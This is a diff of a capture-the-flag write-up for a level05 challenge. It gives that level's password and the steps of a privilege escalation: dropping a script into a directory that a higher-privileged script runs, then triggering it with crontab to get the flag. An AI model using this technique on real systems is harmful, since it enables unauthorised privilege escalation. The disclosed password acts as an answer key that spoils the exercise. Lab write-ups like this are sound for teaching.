@@ -6,7 +6,7 @@ level05's password: `ne2searoevaevoem4ov4ar8ap`
 
 we got some intel from level00:
 
-```shell
+```bash
 -rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver
 /opt/openarenaserver
 /usr/sbin/openarenaserver
@@ -16,7 +16,7 @@ we got some intel from level00:
 
 1. examinate existing files and permissions
 
-```shell
+```bash
 ls -la
 ls -la /usr/sbin/openarenaserver
 cat /usr/sbin/openarenaserver
@@ -26,13 +26,13 @@ shows a shell script that runs all scripts in `/opt/openarenaserver`, and that t
 
 2. create an exploit script
 
-```shell
+```bash
 echo -e "getflag > /opt/openarenaserver/flag" > /opt/openarenaserver/exploit.sh
 ```
 
 3. make it run as flag05 with flag05 script and crontab
 
-```shell
+```bash
 crontab -e
 * * * * * /opt/openarenaserver/exploit.sh
 ```
@@ -41,7 +41,7 @@ to execute exploit every minute
 
 4. wait crontab's execution (next minute second 0) then pwn the flag
 
-```shell
+```bash
 uptime
 cat /opt/openarenaserver/flag
 ```
